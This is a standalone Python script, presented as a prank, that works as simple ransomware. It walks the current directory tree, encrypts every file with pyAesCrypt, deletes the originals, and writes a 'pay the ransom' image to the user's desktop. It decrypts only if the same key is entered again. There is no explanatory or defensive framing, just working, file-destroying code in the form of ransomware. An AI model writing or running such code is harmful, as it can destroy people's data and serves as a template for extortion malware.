import os
import sys
import subprocess
import pyAesCrypt
from PIL import Image, ImageDraw, ImageFont

def encrypt_files(key):
    # Get the current directory
    current_dir = os.getcwd()
    
    # Encrypt all files in the current directory
    for root, dirs, files in os.walk(current_dir):
        for file in files:
            file_path = os.path.join(root, file)
            pyAesCrypt.encryptFile(file_path, file_path + ".encrypted", key)
            os.remove(file_path)

def display_funny_message():
    # Get the desktop path
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    
    # Create a new image
    image = Image.new('RGB', (800, 600), color='white')
    
    # Write the funny message on the image
    draw = ImageDraw.Draw(image)
    font = ImageFont.truetype('arial.ttf', 60)
    funny_message = "Your files have been encrypted and cannot be accessed until you pay the ransom!"
    draw.text((100, 300), funny_message, fill='black', font=font)
    
    # Save the image
    image.save(os.path.join(desktop_path, 'funny_message.png'))

def decrypt_files(key):
    # Get the current directory
    current_dir = os.getcwd()
    
    # Decrypt all files in the current directory
    for root, dirs, files in os.walk(current_dir):
        for file in files:
            if file.endswith(".encrypted"):
                file_path = os.path.join(root, file)
                decrypted_file_path = file_path[:-11]
                pyAesCrypt.decryptFile(file_path, decrypted_file_path, key)
                os.remove(file_path)

def main():
    # Prompt for the encryption key
    key = input("Enter the encryption key: ")
    
    # Encrypt all files
    encrypt_files(key)
    
    # Display a funny message on the desktop screen
    display_funny_message()
    
    # Prompt for the decryption key
    decryption_key = input("Enter the decryption key: ")
    
    # Decrypt files if the decryption key is correct
    if decryption_key == key:
        decrypt_files(key)
    else:
        print("Incorrect decryption key. Your files are still encrypted.")

if __name__ == "__main__":
    main()